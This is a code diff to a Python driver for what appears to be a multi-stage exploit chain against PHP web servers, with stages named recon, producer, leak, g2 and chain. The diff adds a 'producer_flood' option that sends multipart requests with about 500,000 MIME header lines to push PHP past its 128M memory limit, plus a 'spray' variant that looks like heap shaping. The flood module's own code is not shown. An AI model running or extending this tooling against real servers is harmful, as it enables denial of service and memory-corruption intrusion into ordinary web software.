@@ -23,6 +23,7 @@ from tool.modules import chain_stage as chain_stage_module  # noqa: E402
 from tool.modules import g2_chain as g2_chain_module  # noqa: E402
 from tool.modules import leak_stage as leak_stage_module  # noqa: E402
 from tool.modules import producer_fpmwiki as producer_stage  # noqa: E402
+from tool.modules import producer_flood as flood_producer_stage  # noqa: E402
 from tool.modules import producer_modphp as modphp_producer_stage  # noqa: E402
 from tool.modules import producer_unser as unser_producer_stage  # noqa: E402
 from tool.modules import write_stage as write_stage_module  # noqa: E402
@@ -80,7 +81,7 @@ STAGES = ("recon", "producer", "write_stage", "leak", "g2", "chain")
 def run_producer_step(
     host: str,
     port: int,
-    body_bytes: int,
+    body_bytes: int | None,
     output: Path,
     timeout: float,
     target_name: str | None = None,
@@ -89,6 +90,8 @@ def run_producer_step(
     sid: str | None = None,
     producer: str | None = None,
     unser_url: str | None = None,
+    flood_headers: int | None = None,
+    flood_variant: str = "flood",
 ) -> tuple[dict, Path]:
     """Producer stage entrypoint, routed by producer module.
 
@@ -98,7 +101,18 @@ def run_producer_step(
     fall back to producer_fpmwiki.
     """
     stage_name = profiles.resolve_producer(target_name, producer)
-    if stage_name == "producer_modphp":
+    if stage_name == "producer_flood":
+        # stock-128M header flood: body bytes are derived from --flood-headers,
+        # so body_bytes is ignored (main() rejects a conflicting --body-bytes).
+        summary = flood_producer_stage.fire(
+            host, port,
+            flood_headers if flood_headers is not None
+            else flood_producer_stage.DEFAULT_HEADER_COUNT,
+            output, memory_limit, timeout=timeout,
+            path=path or flood_producer_stage.DEFAULT_PATH,
+            variant=flood_variant, cookie_sid=sid,
+        )
+    elif stage_name == "producer_modphp":
         knob = memory_limit or (profiles.TARGETS.get(target_name) or {}).get(
             "memory_limit_knob")
         if sid is None:
@@ -710,12 +724,28 @@ def main() -> int:
         "default: the producer module default (fpmwiki 5700000, modphp 262144)",
     )
     parser.add_argument(
+        "--flood-headers",
+        type=int,
+        default=None,
+        help="producer_flood: number of `X: v` MIME header lines in the file "
+        "part (6 wire bytes each; default 500000; stock 128M OOM measured "
+        "between 425000 and 430000 on the full arm)",
+    )
+    parser.add_argument(
+        "--flood-variant",
+        choices=flood_producer_stage.VARIANTS,
+        default=None,
+        help="producer_flood arm: flood = 1001 x 1-byte fields (stage1 A, "
+        "3,072,588 B), spray = 1001 x 3000-byte fields (rotate A, 6,074,587 B); "
+        "default flood",
+    )
+    parser.add_argument(
         "--producer",
         default=None,
         help="producer module override for --step producer or --step chain "
-        "(producer_unser, producer_modphp, producer_fpmwiki; bare names "
-        "accepted); producer default: the target producer_stage (producer_modphp "
-        "stays first on modphp); chain default: producer_unser",
+        "(producer_unser, producer_modphp, producer_fpmwiki, producer_flood; "
+        "bare names accepted); producer default: the target producer_stage "
+        "(producer_modphp stays first on modphp); chain default: producer_unser",
     )
     parser.add_argument(
         "--unser-url",
@@ -734,7 +764,8 @@ def main() -> int:
         default=None,
         help="producer memory_limit: modphp knob value (overrides the TARGETS "
         "record; absence/128M is a pre-flight failure), producer_unser class "
-        "(2M / 8M / 128M; default: the target knob), or chain producer knob/class",
+        "(2M / 8M / 128M; default: the target knob), producer_flood stock "
+        "default only (128M or absent), or chain producer knob/class",
     )
     parser.add_argument(
         "--sid",
@@ -840,6 +871,11 @@ def main() -> int:
     if args.producer and args.step not in ("producer", "chain"):
         parser.error("--producer only applies to --step producer or --step chain")
 
+    if args.flood_headers is not None or args.flood_variant is not None:
+        if args.step != "producer":
+            parser.error(
+                "--flood-headers/--flood-variant only apply to --step producer")
+
     target_name = args.target
     url = args.url
     if target_name is not None and target_name.startswith(("http://", "https://")):
@@ -887,36 +923,57 @@ def main() -> int:
     if sequence_chain and (args.unser_url is None or args.arm_url is None):
         parser.error("--step chain requires --unser-url and --arm-url")
 
+    flood_headers = None
+    flood_variant = "flood"
     if args.step == "producer":
         try:
             producer_stage_name = profiles.resolve_producer(target_name, args.producer)
         except ValueError as error:
             parser.error(str(error))
-        if args.body_bytes is None:
-            body_bytes = (
-                modphp_producer_stage.DEFAULT_BODY_BYTES
-                if producer_stage_name == "producer_modphp"
-                else producer_stage.DEFAULT_BODY_BYTES
-            )
-        else:
-            body_bytes = args.body_bytes
-        if producer_stage_name == "producer_unser":
-            knob = args.memory_limit or (profiles.TARGETS.get(target_name) or {}).get(
-                "memory_limit_knob")
+        if producer_stage_name == "producer_flood":
+            if args.body_bytes is not None:
+                parser.error(
+                    "--body-bytes does not apply to producer_flood: the body is "
+                    "derived from --flood-headers")
+            flood_variant = args.flood_variant or "flood"
             try:
-                unser_producer_stage.class_record(knob)
-            except (TypeError, ValueError, NotImplementedError) as error:
-                parser.error(f"--memory-limit: {error}")
-        else:
-            producer_stage_module = (
-                modphp_producer_stage
-                if producer_stage_name == "producer_modphp"
-                else producer_stage
-            )
-            try:
-                producer_stage_module.validate_body_bytes(body_bytes)
+                flood_headers = flood_producer_stage.validate_header_count(
+                    args.flood_headers if args.flood_headers is not None
+                    else flood_producer_stage.DEFAULT_HEADER_COUNT)
+                flood_producer_stage.validate_memory_limit(args.memory_limit)
+                flood_producer_stage.validate_variant(flood_variant)
             except (TypeError, ValueError) as error:
-                parser.error(f"--body-bytes: {error}")
+                parser.error(f"--flood-headers/--memory-limit: {error}")
+            body_bytes = None
+        else:
+            if args.flood_headers is not None or args.flood_variant is not None:
+                parser.error(
+                    "--flood-headers/--flood-variant require --producer flood")
+            if args.body_bytes is None:
+                body_bytes = (
+                    modphp_producer_stage.DEFAULT_BODY_BYTES
+                    if producer_stage_name == "producer_modphp"
+                    else producer_stage.DEFAULT_BODY_BYTES
+                )
+            else:
+                body_bytes = args.body_bytes
+            if producer_stage_name == "producer_unser":
+                knob = args.memory_limit or (profiles.TARGETS.get(target_name) or {}).get(
+                    "memory_limit_knob")
+                try:
+                    unser_producer_stage.class_record(knob)
+                except (TypeError, ValueError, NotImplementedError) as error:
+                    parser.error(f"--memory-limit: {error}")
+            else:
+                producer_stage_module = (
+                    modphp_producer_stage
+                    if producer_stage_name == "producer_modphp"
+                    else producer_stage
+                )
+                try:
+                    producer_stage_module.validate_body_bytes(body_bytes)
+                except (TypeError, ValueError) as error:
+                    parser.error(f"--body-bytes: {error}")
 
     if args.output is None:
         stamp = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
@@ -950,6 +1007,7 @@ def main() -> int:
                 target_name=target_name, path=path,
                 memory_limit=args.memory_limit, sid=args.sid,
                 producer=args.producer, unser_url=args.unser_url,
+                flood_headers=flood_headers, flood_variant=flood_variant,
             )
         except (ConnectionError, OSError, TimeoutError, ValueError,
                 NotImplementedError) as error:
@@ -961,6 +1019,9 @@ def main() -> int:
                 "body_bytes": body_bytes,
                 "error": f"{type(error).__name__}: {error}",
             }
+            if flood_headers is not None:
+                summary["flood_headers"] = flood_headers
+                summary["flood_variant"] = flood_variant
             rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
             args.output.mkdir(parents=True, exist_ok=True)
             (args.output / "result.json").write_text(rendered)
